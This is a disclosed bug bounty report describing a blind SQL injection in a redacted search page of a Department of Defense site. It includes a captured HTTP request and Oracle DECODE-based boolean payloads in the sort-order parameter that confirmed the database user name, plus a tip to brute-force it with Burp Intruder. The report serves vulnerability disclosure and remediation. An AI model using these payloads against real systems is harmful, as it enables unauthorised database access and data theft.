# Blind Sql Injection in https://█████/qsSearch.aspx

## Report Details
- **Report ID**: 2081316
- **URL**: https://hackerone.com/reports/2081316
- **State**: Closed
- **Severity**: high
- **Submitted**: 2023-07-24T06:51:48.041Z
- **Disclosed**: 2023-09-08T17:19:05.710Z

## Reporter
- **Username**: hack0neone
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: deptofdefense

## Vulnerability Information
**Description:**

access

https://████████/qsSearch.aspx

Click to sort capture packets

```
POST /qsSearch.aspx HTTP/1.1
Host: ████████
Cookie: ASP.NET_SessionId=qrwzcesx1pczpna5a1bumabn; TS01e0cc7d=01a9fe659bc0aaa5aeffd1dcb0212ef4158c4865925e960169a653a233f6de5425138871ffe81b759d57e8cd4d192f460a8455c20a; TS64c50bb0027=085749d0e4ab2000abff03ce041a6de3cdc980bad78329f846f8a7d1a3ca714fca41b9f4477ff74908e5615eaa1130003df96bf750318bbc06de7b8d1dc03b675cf0ea51da191b5c8a95008b8d5b3f758c0ed139489903314d8927a8c58c8d9d
Content-Length: 3764
Sec-Ch-Ua: "Not.A/Brand";v="8", "Chromium";v="114", "Google Chrome";v="114"
Sec-Ch-Ua-Mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Cache-Control: no-cache
X-Requested-With: XMLHttpRequest
X-Microsoftajax: Delta=true
Sec-Ch-Ua-Platform: "Windows"
Accept: */*
Origin: https://██████
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://██████████/qsSearch.aspx
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close

ScriptManager1=UpdatePanelWhole%7CGetFilteredButton&DocumentIDTextBox=&IDNumberTextBox=&DropDownListStatus=&DocumentTitleKeyWords=&DropDownListContains=AND&DropDownListTitleOrKeywords=TOS&TextBoxBegin_Date=24-Jul-2022&TextBoxEnd_Date=24-Jul-2023&FromSession_HFS=0&DocumentIDTextBox_HFS=&IDNumberTextBox_HFS=&DropDownListStatus_HFS=&DocumentTitleKeyWords_HFS=&DropDownListContains_HFS=&DropDownListTitleOrKeywords_HFS=&ExListBoxFSCHF=1010&ExListBoxFSCHFN=2&ExListBoxFSCHFN_HFS=&UseTransDateCheckBox_HFS=&TextBoxBegin_Date_HF=24-Jul-2022&TextBoxEnd_Date_HF=24-Jul-2023&TextBoxBegin_Date_HFS=24-Jul-2022&TextBoxEnd_Date_HFS=24-Jul-2023&Command_HFS=&divPreamble_HF=block&HiddenFieldSortOrder=seqno&__EVENTTARGET=&__EVENTARGUMENT=&__VIEWSTATE=q7mOdp7JADLouhLb0iBsjhyqsgYBjR4m66bmTYp5jGGY0Unk%2FoBSV%2FV5DY4cM8i4AetQ7yIP7NpGAwDZNg1mENuO17N0e9RMjj9k84Mz8Z12lbblsQ3pvMzMXGqVFlV5AapE1ZPF3Lw3mHyNQwU9U8rmLIlySVVc9Fq9r1FEk4E198exJH0aVmUhqMLdX6ah4%2F4jaTRYRASPB6C8VdKG2gvAnVsh%2BQzU05lZGLYsqw8j8EiFXbKKni0hgSjiD%2B%2BanYn9w4xMz5llIOP81jz9jSB479hqo3yuFWuOO91Vr539KvcO7XzstILWDgVLtDeDPw3p2DTZM2PS0vOVnNDpJX6rr76mJfFWD9DJUOSkvCDpz0tGwNcGWZPO0j%2FkaUY%2Fh9L5%2FOblr4Zd6XcWiyo3Sal%2BtCvQnZuzPyCjL33IEpuGojcsUBeY8Aq%2FkFbVr%2Be3cXUSzzBwirfXTdneWQFQlfq8xWxKI2YHsnLZHLNKB3%2FsgP0vvRV1yXvsbC9RfTGhUiK2S%2Bg4XHzadLggy5djNZMHvoulqRwagO7EeksJyWGma9jVCQoc4Vqe3IjRbjmyaZOltk%2BZxh%2FC9P%2BPdT9lhapBOyuXvVDJL862rRIIfJEUo9NJ0ES%2FRRHdk2NO44DsXT99Rj89iOZY1ZgFaAqQEYXhVQEIfFdyMjP52QR2d6ljjjQahESe88R34h9YuLQVGMnZnqwCSgOqjD%2Fw7iuA4fkYrq5zu2muXogAnT%2BYdVe03PNUlMAhdr3oVzTmipt2ezsMpNtGU%2B%2FKO67w8xvPtdMcU1r%2FDWXlU%2BMgnxpWKBfcwk8BMKvSStAX7lxPg%2BAFXJ4W%2B4mMAg6xybe8nfyVtfbcC%2FLT21%2FAo6DA1EP0%2Bquy6r7RSx%2BCSQiQ9FMEn29J%2FEvOYsub01L3h%2FHXt5%2BgfM9lWS1DRQmEbIT9Sy9aXm895QHjFJwR4ZKU%2FV2YqyvpqYxBstMen3tClb74MXUOGLEwkR2SajMOnEvafbc2eND%2BeGkhPvX308aFuCcS92UIOD0YE52Xf%2FvCaFkbYhBFQ3DDTvEsKYq%2Feiv2tdt3t34jpVDYpVuZBjYrE5CKYNZ%2FshSfBGFd3WkyogypS6WwmW4p8tAIP6nZbewu3ljQmfclpQfSEZ1U86hc7R6%2F8Qi5H%2FUoPZkSXdhS7YZ%2FUk2uEFJpMPbwrRIisJZDWOK1iXXUfLGlJNHpqXz%2By1HAWEAgoROMjB3PDciwlG4qOWWNf8kHBIXh4mABbQTBRCSviGCU%2B40mxFN5mCxIDlyVSrZtctMDlDEXxsDrgMlIYF9tPu14HiIkcvTvRRDAilxLNj4oJltCSn9Q4KaohPoOCTCB%2FBDChs7i%2FP%2FtVlVv2hseFoW%2FL5nnXrzZwtQ89g1tukB6B0%2BLNIHSPMTNjHfS94KBTjlI%2BDyJQ1moLRAqrI08LuxR5oL4I4xQWFMokDUes%2F9919T%2BsFFY83LeW8l2cnq9HXs1VHWZC52iEE6NKL3O%2FY8rb8ZzJWx73Vy6%2F4ycbMhmXmBKDL0jPp7pWQwCSF%2Bi3utC6fYzXYVplK%2F%2FUB%2Bl%2Fx3FHulj%2BxbNXbXDNwW9la1gvmiZCBVNBF8Hs9f723CNP9Mk36HeRhnqrv%2BXjT3ru9VUIreZuYLP%2FJMDsMa5hkxNqsGSiYSaVnQdNoh16MX%2FpwD9TFjeLR9trbuYbOe85Q%3D%3D&__VIEWSTATEGENERATOR=23D07230&__VIEWSTATEENCRYPTED=&__EVENTVALIDATION=fsWUuj%2Bv6uAzn%2BPDJy53TOV1EcwpGMzzgrX8HnHdm3%2BXLE0nnYzmv2wV%2FC1MQ36juB9R3FuomPHAhDRTQjaWLLfUo8wqsKkA5oRH27Q0drnd19OLne7P%2F1e7JVyrg3T7IUqgzt668Uf70ylQ0%2Fzm3R8l55e7NMhkJqrNAfwmRnqo01McSaS%2FfV2vktFK2Xg07rplRCRRnjFxz7PgRNyHTd27PGi2JuvyZ661dcSKhHjRUnOe2JvQjiSZRCepgNLisbabLxz3fm%2B1iLqiMbDSRQ%2B%2FD9NNzQ7zv3dFfSQUnFPX7n1%2BN1rxmuSYIrjumhEcO4WaCoted6V4GkC2aj2XlwuOdyJCc5KK83LLHqei%2FQ%2BOYJ70T2sxY5kfRDyc6T5%2BMoqHE6Xl9T6fgHQNss4Ed5vnM1hZ3wZQF2roYILiJnGRewNWVEtDjNbGId6AosGd%2BG8TPm5qmRver%2Fwe%2F61TFc7jVz6dKVS30uH7AAbYcbuytwOXLSNwGrfEQdJWBRfL0fof2hrE1%2BnpdhhTCaZr09ezPUk6vJZKXWxxwYfIcDAiy6VF696%2BrN1sK3DqQY2Ml1ycdVU9IGR7gt0JAr256BTzhp2JqdP3MUmPfzzJUb8yPVIdutWg4s6wd9hZJOffo1XGfM97vgmG31OsKt6Ce5%2Fnvd9EtqYThA73N7lRz3Rbia%2FoGCb%2BSZT%2Fgry9ERSpe772GIZgiIkfmmIH81KdA3ng3UGEUW%2BJQaJ1nqUpqa%2BkvQoXNYP6cgpyJXpqPUBh92Dur9tj6rGmgFWcHMly1EoNjkhmUq2A3Rx3Y4cv8%2F%2FFXK0Q3FHiGe838a3kotnxO5JySmyB%2FaV4pfNfyo0YVRk51Od9eE7%2FtAKgSe11mFqXg2cB0SEJn7JIhMBuozxVV6hW1ja2QpLVxqZxfar1K3Fw8gk%2FOcYpDaEVlE8MLzAft9GeMFoKWMCNXkY9jz80fSlJzDLSHEZ%2BVahTxgsrEeQpo9IzdKvvm2p6RPOYIS4%3D&__ASYNCPOST=true&GetFilteredButton=Search
```

HiddenFieldSortOrder is sql injection parameter


███

payload：

user length=5

seqno-DECODE(length(user),5,1,1/0)   The page returns normal data
█████

The length of the user is incorrect, and the page returns abnormal data
████████

and

user=QSWEB
seqno-DECODE(lpad（user,5),'QSWEB',1,1/0)  The page returns normal data
███

The database user does not return abnormal data to the page
███

We can use the burp intruder template to violently enumerate database usernames .Judging whether the user is correct based on the returned length

███
█████

 
## References

## Impact

An attacker can use SQL injection to bypass a web application's authentication and authorization mechanisms and retrieve the contents of an entire database. SQLi can also be used to add, modify and delete records in a database, affecting data integrity. Under the right circumstances, SQLi can also be used by an attacker to execute OS commands, which may then be used to escalate an attack even further.

## System Host(s)
██████

## Affected Product(s) and Version(s)


## CVE Numbers


## Steps to Reproduce
seqno-DECODE(lpad(user,5),'QSWEB',1,1/0)

true 


seqno-DECODE(lpad(user,5),'QSWE1',1,1/0)

false

## Suggested Mitigation/Remediation Actions




## Attachments
No attachments
